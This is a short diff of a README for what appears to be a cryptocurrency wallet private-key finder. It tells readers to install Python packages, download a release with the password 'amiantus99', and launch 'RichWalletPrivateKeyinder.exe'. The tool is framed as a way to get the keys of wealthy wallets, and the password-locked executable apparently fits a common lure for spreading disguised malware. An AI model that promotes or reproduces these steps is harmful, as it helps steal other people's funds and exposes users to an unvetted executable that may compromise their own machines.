@@ -13,7 +13,7 @@ First Install This Package's :
 pip install cryptofuzz colorama
 ```
 
-After install Run Program downloading the latest release, Password: amiantus99
+Downloading the latest release, Password: amiantus99
 ```
 Launch RichWalletPrivateKeyinder.exe
 ```
